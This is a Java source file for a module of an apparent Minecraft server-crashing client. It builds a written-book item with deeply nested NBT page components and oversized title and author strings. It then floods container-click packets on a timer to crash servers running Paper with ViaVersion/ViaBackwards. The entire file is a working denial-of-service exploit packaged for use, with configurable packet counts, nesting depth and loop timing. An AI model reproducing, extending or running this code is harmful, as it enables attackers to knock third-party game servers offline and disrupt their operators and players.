package me.dannycrasher.client.module.impl.crash;

import com.viaversion.viafabricplus.ViaFabricPlus;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.Protocol;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataWrittenBookContent;
import me.dannycrasher.client.protocol.components.data.impl.Filterable;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;
import me.dannycrasher.client.protocol.packets.PacketCodec;
import me.dannycrasher.client.protocol.packets.play.PacketContainerClick;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.Tag;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class WrittenBookCrash extends Module {
	public WrittenBookCrash() {
		super("WrittenBook", "Written book NBT page bomb (Paper and ViaVersion/ViaBackwards Abuser)", ModuleType.CRASHER);
		addArgument("packets", ArgumentType.INT, 1, 100, "100");
		addArgument("pages", ArgumentType.INT, 1, 15, "15");
		addArgument("nbtDepth", ArgumentType.INT, 1, 32, "16");
		addArgument("map size", ArgumentType.INT, 1, 46, "46");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1500");
		addArgument("loopAmount", ArgumentType.INT, 1, 30, "15");
	}

	private ScheduledExecutorService executorService;

	@Override
	public void executeModule(ModuleContext context) {
		int packets = context.getInt("packets");
		int pages = context.getInt("pages");
		int nbtDepth = context.getInt("nbtDepth");
		int mapSize = context.getInt("map size");
		int threadSleep = context.getInt("threadSleep");
		int loopAmount = context.getInt("loopAmount");

		setEnabled(true);

		if (executorService != null && !executorService.isShutdown()) {
			executorService.shutdownNow();
			context.sendMessage("Previous attack <red>stopped<white>!");
		}

		if (Protocol.FULL_ITEM_PROTOCOLS.contains(ViaFabricPlus.getImpl().getTargetVersion().getVersion())) {
			Tag nestedPayload = buildNestedPayload(nbtDepth);
			List<Filterable<Tag>> pagesList = new ArrayList<>();
			for (int i = 0; i < pages; i++) {
				pagesList.add(new Filterable<>(nestedPayload, null));
			}

			String oversizedTitle = "A".repeat(Math.min(nbtDepth * 8, 256));
			String oversizedAuthor = "B".repeat(Math.min(nbtDepth * 8, 256));

			DataWrittenBookContent writtenBookContent = new DataWrittenBookContent(
					new Filterable<>(oversizedTitle, null),
					oversizedAuthor,
					0,
					pagesList,
					true
			);
			DataComponents dataComponents = new DataComponents();
			dataComponents.put(writtenBookContent);

			ItemStack itemStack = new ItemStack(
					ItemType.WRITTEN_BOOK.getId(ViaFabricPlus.getImpl().getTargetVersion().getVersion()),
					1,
					dataComponents);

			Int2ObjectMap<ItemStack> int2objectmap = new Int2ObjectOpenHashMap<>();
			for (int j = 0; j < mapSize; ++j) {
				int2objectmap.put(j, itemStack);
			}

			context.sendMessage("Start crashing with method: <aqua>" + getName() + "<white>!");

			AtomicInteger check = new AtomicInteger(0);
			executorService = Executors.newSingleThreadScheduledExecutor();
			Runnable clickTask = () -> {
				if (!isEnabled() || check.get() == loopAmount || (Minecraft.getInstance().getConnection() == null || !Minecraft.getInstance().getConnection().getConnection().isConnected())) {
					executorService.shutdown();
					setEnabled(false);
					context.sendMessage("Attack <green>successful <white>finished!");
				} else {
					PacketCodec.sendPacket(new PacketContainerClick(
									ViaFabricPlus.getImpl().getTargetVersion().getVersion(),
									0,
									1,
									10,
									PacketContainerClick.ContainerActionType.CLICK_ITEM,
									PacketContainerClick.ContainerAction.RIGHT_CLICK,
									itemStack,
									int2objectmap),
							packets);
				}

				check.getAndIncrement();
			};
			executorService.scheduleAtFixedRate(clickTask, 0, threadSleep, TimeUnit.MILLISECONDS);
		} else {
			context.sendMessage("<red>You cant use this method on the version you are currently on. Change the version in viafabric");
		}
	}

	private static Tag buildNestedPayload(int depth) {
		CompoundTag root = new CompoundTag();
		root.putString("text", ".");
		ListTag extras = new ListTag();
		CompoundTag current = root;
		for (int i = 0; i < depth; i++) {
			CompoundTag child = new CompoundTag();
			child.putString("text", ".");
			ListTag childExtras = new ListTag();
			extras.add(child);
			current.put("extra", extras);
			extras = childExtras;
			current = child;
		}
		return root;
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		if (executorService != null) {
			executorService.shutdownNow();
		}
	}
}
